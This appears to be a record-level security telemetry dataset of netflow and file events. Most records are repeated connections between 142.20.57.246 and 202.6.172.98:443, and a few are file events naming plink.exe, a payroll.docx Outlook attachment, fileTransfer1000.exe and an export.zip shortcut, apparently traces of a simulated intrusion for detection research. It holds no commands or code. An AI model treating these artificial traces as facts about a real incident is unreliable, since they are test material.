e4e82d48-24f1-463f-b1d4-0726da49edb4,{'netflow': '142.20.57.246:53886->202.6.172.98:443'},845825
a02d4380-b76c-463d-affe-958354b447d3,{'netflow': '202.6.172.98:443->142.20.57.246:53320'},825884
d7c2a23a-748c-49e9-9b7d-b19779e62502,{'netflow': '142.20.57.246:53323->202.6.172.98:443'},825891
bec61871-4f7b-4427-bf8a-082b8652744a,{'netflow': '142.20.57.246:53378->202.6.172.98:443'},829992
ff1a5365-cdbc-4e67-b76d-e59a98c68a2d,{'netflow': '142.20.57.246:49985->202.6.172.98:443'},807465
9c40df1a-ae87-4605-a44d-f2a7e4f1d2b8,{'netflow': '202.6.172.98:443->142.20.57.246:53323'},825900
b448f588-0b38-4653-a520-fd82d3f42b7a,{'netflow': '142.20.57.246:53324->202.6.172.98:443'},825901
5d1d1232-3165-4910-b982-2399004452b1,{'netflow': '142.20.57.246:50071->202.6.172.98:443'},811566
7d65d936-0757-4bb7-bce4-c2964055e421,{'netflow': '142.20.57.246:50072->202.6.172.98:443'},811567
81c79526-542b-4bb3-bbd2-ce923b6da3df,{'netflow': '142.20.57.246:53503->202.6.172.98:443'},842285
20f749a4-879f-4eea-9411-31564a49a79b,{'netflow': '142.20.57.246:49972->202.6.172.98:443'},805425
3d3d414b-69fa-41bb-be71-a5862b26a0c6,{'netflow': '142.20.57.246:53345->202.6.172.98:443'},827954
aa934b14-4d67-4ed5-a6b1-804c1e0bec31,{'netflow': '202.6.172.98:443->142.20.57.246:53324'},825906
e9f148c3-b262-44fe-9665-bb32b3c84a61,{'netflow': '202.6.172.98:443->142.20.57.246:53472'},838200
8f51fc28-a92e-4145-a6ca-bb7853bd5685,{'netflow': '142.20.57.246:54012->202.6.172.98:443'},860732
914609da-70a8-468d-ab4e-5815b4d6de8b,{'netflow': '202.6.172.98:443->142.20.57.246:49972'},805436
41bf7ac5-9b67-4cda-8b21-e4673d7ef57a,{'netflow': '202.6.172.98:443->142.20.57.246:50071'},811583
e01b9128-0065-4a14-ba10-863f2bc813b3,{'netflow': '202.6.172.98:443->142.20.57.246:50072'},811584
6aabc3cd-ebd6-45f8-b483-dda9b9d05bff,{'netflow': '142.20.57.246:53877->202.6.172.98:443'},844351
2209b75c-72fb-4bcd-9df8-11d52b39d227,{'netflow': '202.6.172.98:443->142.20.57.246:53877'},844354
b9f77069-1af7-452e-8b46-b4f98fa8ec46,{'netflow': '142.20.57.246:53956->202.6.172.98:443'},854597
0ebfc37c-43fb-4573-ab96-45baeec17bf6,{'netflow': '142.20.57.246:53488->202.6.172.98:443'},840262
de10aa49-1d8a-49e8-a64b-102798668f71,{'netflow': '142.20.57.246:53450->202.6.172.98:443'},836167
d6ae8968-bb5b-49a4-9fc4-d1da066961e7,{'netflow': '202.6.172.98:443->142.20.57.246:53956'},854600
7adeeb2e-7b92-469b-a9c0-e868ddf4c84e,{'netflow': '202.6.172.98:443->142.20.57.246:53450'},836168
6a48b1ba-a6cf-4257-a308-905efe9a0664,{'netflow': '142.20.57.246:53299->202.6.172.98:443'},823888
7e31fff5-8158-4a5a-b47b-31d42e34a91d,{'netflow': '202.6.172.98:443->142.20.57.246:49985'},807505
ee95e905-a84b-4fdb-9e8b-385aa89a127a,{'netflow': '142.20.57.246:53379->202.6.172.98:443'},830033
134978b1-0d1e-4e35-b4d5-9b9067ff2cdf,{'netflow': '202.6.172.98:443->142.20.57.246:53299'},823891
0438d82d-c332-45b2-8b31-a05132f7c877,{'netflow': '202.6.172.98:443->142.20.57.246:53503'},842324
f7eba821-d585-49ff-bed7-8cdd0985a2dd,{'netflow': '202.6.172.98:443->142.20.57.246:54012'},860755
9d3eabd8-1ad6-4972-bd0f-53bcccc6fce8,{'netflow': '142.20.57.246:53899->202.6.172.98:443'},846423
625c39df-f913-4201-ac97-aedc0a63eeba,{'netflow': '142.20.57.246:49986->202.6.172.98:443'},807513
066aad08-642c-4bf8-901f-bc59c68fb868,{'netflow': '142.20.57.246:53325->202.6.172.98:443'},825945
f08cae4f-c56c-4af9-8a8e-b8b5dd776fdd,{'netflow': '202.6.172.98:443->142.20.57.246:49986'},807516
eb7d9277-8346-4d24-8cdb-48d6d2a44bae,{'netflow': '202.6.172.98:443->142.20.57.246:53926'},850525
9a64d3d3-892f-4944-a087-406c6f768654,{'netflow': '202.6.172.98:443->142.20.57.246:53378'},830048
2b1e785b-0631-4508-9e37-0a6b3f4f3153,{'netflow': '202.6.172.98:443->142.20.57.246:53379'},830049
a78ee0ec-e73a-42aa-b39b-0599e6077439,{'netflow': '142.20.57.246:53927->202.6.172.98:443'},850528
43d179ee-7c22-4640-b9a5-8625345b6a2e,{'netflow': '142.20.57.246:53346->202.6.172.98:443'},828007
1ae71da2-f924-48d9-8d22-10cd23364c9f,{'netflow': '202.6.172.98:443->142.20.57.246:53345'},828008
e85a23d5-7965-48b9-b4d8-5e97c3d0e493,{'netflow': '142.20.57.246:53380->202.6.172.98:443'},830060
1e73c8cb-7e16-474f-ad4d-bfadd43786a2,{'netflow': '142.20.57.246:53451->202.6.172.98:443'},836204
80e3b781-f1a5-4d07-ba51-a57d4d408c15,{'netflow': '202.6.172.98:443->142.20.57.246:53488'},840307
29ca825a-32b9-4334-9eec-f2695f997a88,{'netflow': '202.6.172.98:443->142.20.57.246:53346'},828026
bde110fa-c60a-4825-8b39-8c638192d582,{'netflow': '142.20.57.246:50073->202.6.172.98:443'},811642
4b46b97f-bef3-4365-9ee3-964897aadd1c,{'netflow': '142.20.57.246:50074->202.6.172.98:443'},811644
9dc7e5e7-9b13-42da-b08f-24adf4cf01d3,{'netflow': '142.20.57.246:53977->202.6.172.98:443'},856701
a0e55c67-09f3-418f-9896-fe138c691999,{'netflow': '202.6.172.98:443->142.20.57.246:53402'},832132
521e478b-c1f3-4f20-82bb-0a93a2f70c4f,{'netflow': '202.6.172.98:443->142.20.57.246:53977'},856713
ce928b33-0345-4f98-966b-088271ab165c,{'netflow': '142.20.57.246:53402->202.6.172.98:443'},832139
b3896101-d80c-4902-9e5e-af7c4d30a2df,{'file': '/Device/HarddiskVolume1/Windows/system32/plink.exe'},84619
864d896a-e430-4d12-a876-18f6c38398d4,{'netflow': '142.20.57.246:53504->202.6.172.98:443'},842381
41f5b897-bf3b-4982-8c03-f6aa5a3db098,{'netflow': '142.20.57.246:53435->202.6.172.98:443'},834190
1577a7c9-8c08-4a94-9a16-a031dcdcff4c,{'netflow': '202.6.172.98:443->142.20.57.246:53927'},850579
7cfe02d2-b403-4488-8515-703b85d7780a,{'netflow': '142.20.57.246:53979->202.6.172.98:443'},856725
d1dbe15e-cf51-4ae4-9974-302aaf520705,{'netflow': '202.6.172.98:443->142.20.57.246:53979'},856728
33c0acd5-2376-4b41-be54-bcdc2ca44a6d,{'file': '/Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx'},78489
78b70f1c-eba8-48de-b236-59c5f77f2483,{'file': '/Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier'},78490
41b4cbde-8c98-4364-8c66-1ae158d138a3,{'netflow': '142.20.57.246:49999->202.6.172.98:443'},809628
6d0f2c77-c399-4600-80f6-56f1bb83f69a,{'netflow': '202.6.172.98:443->142.20.57.246:53451'},836253
20937182-9c5a-4c71-9312-2d03dab067a0,{'netflow': '202.6.172.98:443->142.20.57.246:50073'},811677
12596df0-f32e-4a89-8c77-20f6c1c7c097,{'netflow': '142.20.57.246:53996->202.6.172.98:443'},858783
c3c63537-708b-4711-aaa5-afbf1a501e25,{'netflow': '142.20.57.246:49973->202.6.172.98:443'},805536
2df87ee1-4322-4b7e-ba3a-2b92b6f0bcb8,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier'},96925
4757c1e8-bf20-4734-9b42-326e9ef0fbcf,{'netflow': '142.20.57.246:53982->202.6.172.98:443'},856744
71e62b27-529e-4dcd-be3e-abc85f451dd0,{'netflow': '202.6.172.98:443->142.20.57.246:53982'},856748
107172a2-ac1d-4b01-a4ad-13dd69ac123c,{'netflow': '142.20.57.246:53255->202.6.172.98:443'},821935
60a41da4-4fcd-4230-8bda-d3108cbabaf5,{'netflow': '142.20.57.246:53347->202.6.172.98:443'},828082
88f4b660-2afa-4dc9-97a6-68be8a783990,{'netflow': '202.6.172.98:443->142.20.57.246:53504'},842419
80c28690-8f9f-4d9b-a88c-3671f37e2652,{'netflow': '142.20.57.246:53957->202.6.172.98:443'},854714
f4ff4134-190b-43de-a132-248d9e5483d0,{'netflow': '202.6.172.98:443->142.20.57.246:53255'},821953
9a890884-072d-4cf2-8f84-e9ef65a7fee5,{'netflow': '142.20.57.246:53878->202.6.172.98:443'},844483
ad868f6a-9295-4b7f-864d-3b22d0c1a2aa,{'netflow': '202.6.172.98:443->142.20.57.246:53380'},830147
31004f99-9c13-46a9-a5c1-19a2eb08c4e0,{'netflow': '202.6.172.98:443->142.20.57.246:53435'},834244
6e815e7d-3689-4166-bb22-9238ecf1a5ea,{'netflow': '142.20.57.246:49987->202.6.172.98:443'},807622
dfa7edb2-b066-4d24-801f-aae338c81452,{'netflow': '142.20.57.246:54013->202.6.172.98:443'},860870
77d2979a-491c-4413-a48b-239b40a08c5c,{'netflow': '142.20.57.246:53452->202.6.172.98:443'},836299
d097596c-958e-4c96-b1bb-ad363bf3da79,{'netflow': '202.6.172.98:443->142.20.57.246:49973'},805579
1a2d3f67-5836-4e11-9a9b-e1a3e20deb69,{'netflow': '202.6.172.98:443->142.20.57.246:53996'},858827
778e96cc-f225-4c96-a1e5-cbf439b8460f,{'netflow': '202.6.172.98:443->142.20.57.246:53452'},836301
28bf45ae-90e7-4795-ba94-4d75fa0ab0ba,{'netflow': '202.6.172.98:443->142.20.57.246:53957'},854736
fcb7c1e7-da89-412f-9d70-558a86c82327,{'netflow': '142.20.57.246:53919->202.6.172.98:443'},848593
167c9367-4648-4278-bb0f-f7050135c6e4,{'netflow': '202.6.172.98:443->142.20.57.246:49987'},807634
2060eefa-d686-4996-be94-52120a9e80ae,{'netflow': '142.20.57.246:53940->202.6.172.98:443'},852691
4639e1f8-a22e-4ef5-9cf0-c861c221bf52,{'netflow': '202.6.172.98:443->142.20.57.246:50074'},811739
b14f83cc-a16f-46ed-8d19-edca27d8d8cc,{'netflow': '202.6.172.98:443->142.20.57.246:53878'},844508
36181957-6f8d-499d-985c-164a949221ad,{'netflow': '202.6.172.98:443->142.20.57.246:53325'},826080
69202a35-9d6b-448b-8ee0-404921514e68,{'netflow': '202.6.172.98:443->142.20.57.246:49999'},809699
41d95e1a-8611-4460-833c-f4dd4d714477,{'netflow': '142.20.57.246:53326->202.6.172.98:443'},826091
2d09a5d6-cb07-45a6-9c33-04283cabd2ad,{'netflow': '142.20.57.246:53348->202.6.172.98:443'},828142
173cd931-27fc-42e2-af5c-ad079c505507,{'netflow': '142.20.57.246:53349->202.6.172.98:443'},828145
633865c9-e83b-4c9b-bc68-17929d82350f,{'netflow': '202.6.172.98:443->142.20.57.246:53899'},846580
698e076b-0071-4517-9a34-ddf463930aab,{'netflow': '142.20.57.246:53350->202.6.172.98:443'},828148
e9f991cb-d494-4fc1-a1f2-22e490abbc21,{'netflow': '142.20.57.246:53928->202.6.172.98:443'},850676
e673ba05-fc8d-47eb-820b-29a1f7861ecd,{'netflow': '142.20.57.246:49974->202.6.172.98:443'},805623
b7a40264-69ce-471e-abbf-4e53c719ad2d,{'netflow': '142.20.57.246:53411->202.6.172.98:443'},832249
84b0644f-e439-4731-94b9-24330fa8efce,{'netflow': '142.20.57.246:53351->202.6.172.98:443'},828153
b43f58d4-d5e2-43a7-9128-ec9f0f27b0cb,{'netflow': '202.6.172.98:443->142.20.57.246:53348'},828155
75360373-e90e-4a01-ad71-d1fe16cefd3e,{'netflow': '202.6.172.98:443->142.20.57.246:53349'},828156
638b7a35-d40c-487c-97ac-2ebf0cde167a,{'netflow': '202.6.172.98:443->142.20.57.246:53347'},828154
dfa358ac-ec3d-41de-b347-33470a75ae76,{'netflow': '202.6.172.98:443->142.20.57.246:53351'},828157
8c183d10-c697-42d0-b611-68ec50edebcc,{'netflow': '142.20.57.246:53300->202.6.172.98:443'},824062
fe968c2a-6f07-43c2-a66c-60dc3e44d1e1,{'netflow': '202.6.172.98:443->142.20.57.246:53350'},828158
4b35a7df-c1da-4d5b-8ab5-35f8d33f7148,{'netflow': '202.6.172.98:443->142.20.57.246:53411'},832263
07de5429-e30c-4dbb-80d1-4b73061f3079,{'netflow': '142.20.57.246:49988->202.6.172.98:443'},807687
441d741b-e570-4f1b-b363-d71341ba3013,{'netflow': '202.6.172.98:443->142.20.57.246:49988'},807694
1d982698-ecde-45c0-9e8d-d1bed7299b05,{'netflow': '202.6.172.98:443->142.20.57.246:53326'},826128
fe618e2b-4bfa-4669-b0c7-837a9a2d9b44,{'netflow': '142.20.57.246:53489->202.6.172.98:443'},840483
88ba71c7-21d5-4059-a151-6b21db71d5d2,{'netflow': '202.6.172.98:443->142.20.57.246:53940'},852773
fb91233a-c32e-4085-9fdc-121f8bc90dff,{'netflow': '142.20.57.246:53473->202.6.172.98:443'},838441
591b6f39-6758-4044-9cb7-60bb9cd7069f,{'netflow': '142.20.57.246:53983->202.6.172.98:443'},856873
a0233740-abfa-409f-8f78-67c7e901efc5,{'netflow': '202.6.172.98:443->142.20.57.246:53928'},850731
d1dfe545-3672-4135-97f6-73bf5be7db54,{'netflow': '142.20.57.246:53414->202.6.172.98:443'},832301
ddb7513a-05b7-46e7-99a1-cfa84319f955,{'netflow': '142.20.57.246:53415->202.6.172.98:443'},832302
c06a6026-ae3c-4257-96e0-7d7a02601d82,{'netflow': '202.6.172.98:443->142.20.57.246:53415'},832303
42f668c8-a90c-4bae-adc7-90a961ac3303,{'netflow': '202.6.172.98:443->142.20.57.246:53473'},838448
25c3845d-2841-4297-bd4d-cf4bece15cfb,{'netflow': '202.6.172.98:443->142.20.57.246:53414'},832304
82e1a9a3-d9f9-4570-b783-20ec83ed9a88,{'netflow': '202.6.172.98:443->142.20.57.246:53983'},856880
81ff6ceb-dde2-4d60-b64d-14f2c8a7d941,{'netflow': '142.20.57.246:53416->202.6.172.98:443'},832307
397b3053-0cbb-4dd4-a1ea-0240380caf8d,{'netflow': '202.6.172.98:443->142.20.57.246:53416'},832308
907cd9f2-58f1-4b1a-acf1-c1a8836fe0e7,{'netflow': '202.6.172.98:443->142.20.57.246:53489'},840508
b5605e0a-1d50-45d3-b475-f950d3ddf379,{'netflow': '142.20.57.246:53453->202.6.172.98:443'},836412
11d5036f-2bb0-4569-a192-777d5cbea4a3,{'netflow': '202.6.172.98:443->142.20.57.246:49974'},805696
2420063e-9d71-4870-a837-4926951c2503,{'netflow': '142.20.57.246:53327->202.6.172.98:443'},826176
c2cac44f-c4f5-495e-b14a-3f03e0bfd6f3,{'netflow': '202.6.172.98:443->142.20.57.246:53327'},826180
cf379169-871f-4802-9d21-129caf9b6dde,{'netflow': '202.6.172.98:443->142.20.57.246:53300'},824137
d51fe4c7-116c-4c60-90ef-30d0fa53917e,{'netflow': '142.20.57.246:53265->202.6.172.98:443'},822090
fc8f75ee-1c46-4d65-80ac-091561ec4e97,{'netflow': '142.20.57.246:53381->202.6.172.98:443'},830282
36932a18-9a9f-4fd0-88f5-3ac50a2ca452,{'netflow': '142.20.57.246:53958->202.6.172.98:443'},854860
2694eb33-5b69-4842-b24b-3cbf334fda52,{'netflow': '202.6.172.98:443->142.20.57.246:53381'},830283
579cdad6-c2d0-4b43-985a-a0d58b94c84b,{'netflow': '202.6.172.98:443->142.20.57.246:53958'},854863
3194a099-f42a-4b23-a91f-5f49de6cf87d,{'netflow': '142.20.57.246:53929->202.6.172.98:443'},850770
87394457-ecc6-4379-936b-af8e5a93a5af,{'netflow': '142.20.57.246:53266->202.6.172.98:443'},822100
3d94121e-42b3-44d7-852d-64b841f14258,{'netflow': '142.20.57.246:49989->202.6.172.98:443'},807765
d5d78a41-8f36-4660-a1c2-b867ab6e38d6,{'netflow': '202.6.172.98:443->142.20.57.246:53919'},848732
556d5da7-a1b4-4390-a048-7f1821bc15bf,{'netflow': '202.6.172.98:443->142.20.57.246:54013'},861023
2bce81fa-d6e6-43d8-8eec-c097174a3c31,{'netflow': '202.6.172.98:443->142.20.57.246:53417'},832357
85b11eb8-2282-4a32-8565-2f0870bc5e5b,{'netflow': '142.20.57.246:53417->202.6.172.98:443'},832358
789f4700-84ab-40dc-ad3c-52c4bd1e273f,{'netflow': '142.20.57.246:53125->202.6.172.98:443'},820069
af83551e-c281-453b-9031-05507662b45c,{'netflow': '202.6.172.98:443->142.20.57.246:53929'},850791
f0e56258-2bf9-4ed6-8bd7-13311a303279,{'netflow': '202.6.172.98:443->142.20.57.246:49989'},807782
a7c0183d-82cc-47d6-baa3-3cb9dc2c1636,{'netflow': '142.20.57.246:53516->202.6.172.98:443'},842602
f4e74e2d-6ab7-4d95-b170-ef04e010e958,{'netflow': '142.20.57.246:50000->202.6.172.98:443'},809837
16092168-fd4d-4890-91fa-b5df3dbd76b7,{'netflow': '142.20.57.246:53328->202.6.172.98:443'},826229
73b8427a-e266-4a66-882e-f96cc37a73c1,{'netflow': '202.6.172.98:443->142.20.57.246:53328'},826230
a8e874cd-167e-48a1-a69b-ca8b6ea88f79,{'netflow': '202.6.172.98:443->142.20.57.246:53516'},842618
bd3bb37f-1663-4a32-812d-5d272ccb2e43,{'file': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe'},93051
e72e0e48-3e50-47a0-8046-fa04119ae83b,{'netflow': '142.20.57.246:53329->202.6.172.98:443'},826257
8b9fdd0e-afed-4c0c-aa1d-fc66d1e0d81f,{'netflow': '202.6.172.98:443->142.20.57.246:53329'},826260
38fa143c-9a24-4fbb-80ea-37304ebfbbbf,{'netflow': '142.20.57.246:53330->202.6.172.98:443'},826263
36909421-9ede-4afa-bed2-c4ee8785e64c,{'netflow': '142.20.57.246:53984->202.6.172.98:443'},856985
53430685-4307-4e18-8a4c-e8bb97ed4473,{'netflow': '202.6.172.98:443->142.20.57.246:53330'},826266
a4696064-3ca0-489e-89de-a188df2897ed,{'netflow': '142.20.57.246:53900->202.6.172.98:443'},846747
6c051141-d8cf-43a3-bce3-4ef7259bc38c,{'netflow': '202.6.172.98:443->142.20.57.246:53984'},856988
14d36b6e-892c-4f6c-b7a6-b2edb9fae965,{'netflow': '142.20.57.246:54014->202.6.172.98:443'},861084
34e22fb4-d0a4-47cf-8396-4567fa82a3f9,{'netflow': '142.20.57.246:50119->202.6.172.98:443'},811940
970821cf-2007-4f70-a570-ac401226ec04,{'netflow': '202.6.172.98:443->142.20.57.246:53265'},822182
10ee6544-662b-4033-a4fa-aac0cc05bebb,{'netflow': '202.6.172.98:443->142.20.57.246:53266'},822183
5c83a6d1-02c0-425c-8a56-20e268ef7b2f,{'netflow': '142.20.57.246:53985->202.6.172.98:443'},857000
4eae78c1-b2dd-4036-9a56-c7f00694af12,{'netflow': '202.6.172.98:443->142.20.57.246:50000'},809899
ce27bcce-0907-4180-b3ea-7cb26cc1c7e2,{'netflow': '202.6.172.98:443->142.20.57.246:50119'},811949
e471da7d-1483-4cc3-a952-3c1a7d3e9e04,{'netflow': '142.20.57.246:53382->202.6.172.98:443'},830381
e8dace7b-b40f-4ad1-bba4-f4bfa4b409b7,{'netflow': '202.6.172.98:443->142.20.57.246:53985'},857007
34af485b-5b91-4d48-ab78-b9662843ebec,{'netflow': '202.6.172.98:443->142.20.57.246:53900'},846778
bd293587-25f7-4c2f-ae84-23ea97e6abe6,{'netflow': '142.20.57.246:53901->202.6.172.98:443'},846782
0f381597-e519-405f-8dfb-1d5e551723e3,{'netflow': '142.20.57.246:53474->202.6.172.98:443'},838593
0ebcd93f-d8c8-4e74-b715-b6348fffbbd2,{'netflow': '142.20.57.246:53331->202.6.172.98:443'},826306
413bf0e5-39b0-4e9d-80d4-c947b3bce75f,{'netflow': '202.6.172.98:443->142.20.57.246:54014'},861125
2428a146-3385-4d65-85e0-799f945c6536,{'netflow': '142.20.57.246:53436->202.6.172.98:443'},834509
c47ed531-9cc9-46db-937f-57832e72c629,{'netflow': '142.20.57.246:53419->202.6.172.98:443'},832462
cbf90b75-d08d-4ecc-ae26-fa84e72595ef,{'netflow': '142.20.57.246:53352->202.6.172.98:443'},828367
d08b8da7-c8ba-4e51-8e61-0094dfe17c85,{'netflow': '142.20.57.246:53418->202.6.172.98:443'},832461
b9ebc1ba-001e-4b68-90da-325549a1b227,{'netflow': '202.6.172.98:443->142.20.57.246:53436'},834514
c1a7d19c-9667-4ad3-a938-e31558b3baf3,{'netflow': '202.6.172.98:443->142.20.57.246:53419'},832467
d8a4e5c9-9906-41ab-b803-6765025c626f,{'netflow': '202.6.172.98:443->142.20.57.246:53418'},832468
6fcdffb3-46d0-4946-a1ba-42ea5f970070,{'netflow': '202.6.172.98:443->142.20.57.246:53474'},838614
7aa2163d-5d23-4619-abbb-f8f5fe39253c,{'netflow': '142.20.57.246:50120->202.6.172.98:443'},811998
9fa53b0a-fed3-4179-a15e-72a364b5e80f,{'netflow': '142.20.57.246:53997->202.6.172.98:443'},859102
7ada625c-aa0c-461b-a79c-0902a253fc77,{'netflow': '202.6.172.98:443->142.20.57.246:53382'},830432
6d09175b-20b1-49d7-a134-c01d10304da4,{'netflow': '202.6.172.98:443->142.20.57.246:50120'},812003
6a40fa62-a5b2-4c14-8227-06d69b7ac5fa,{'netflow': '142.20.57.246:49975->202.6.172.98:443'},805861
a2a79f25-ba45-4303-b291-b48a6319e6a8,{'netflow': '142.20.57.246:49990->202.6.172.98:443'},807915
b280b145-ff2e-4ff5-82b8-a0d983f2bbad,{'netflow': '202.6.172.98:443->142.20.57.246:53352'},828395
38a77017-0f6b-419d-8940-bd1fba967fb0,{'netflow': '142.20.57.246:53353->202.6.172.98:443'},828396
d29fa14c-d10f-4a76-858c-1ff01a2ce7b0,{'netflow': '142.20.57.246:53931->202.6.172.98:443'},850926
fb48b18b-30bd-44fc-bd18-153de314cc3b,{'netflow': '202.6.172.98:443->142.20.57.246:53901'},846831
2443360e-9f7f-425e-8136-bbf1911361bc,{'netflow': '142.20.57.246:53354->202.6.172.98:443'},828401
8e9787d0-5991-48df-888d-9914a56ca8a8,{'netflow': '202.6.172.98:443->142.20.57.246:53997'},859125
22a94f2b-c4e2-49fa-be57-b886bfcd4e30,{'netflow': '142.20.57.246:53490->202.6.172.98:443'},840695
3ebe43cf-a750-4bad-b013-2ea7e0589d52,{'netflow': '142.20.57.246:53902->202.6.172.98:443'},846842
b319cdb0-b1eb-4e35-8edd-465518cd8701,{'netflow': '142.20.57.246:53941->202.6.172.98:443'},852999
4de14474-aca1-49cd-afe6-9e7eed4fd2b8,{'netflow': '142.20.57.246:49928->202.6.172.98:443'},803849
02280134-6e0d-4bec-85fb-3b5898832c56,{'file': '/Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk'},95241
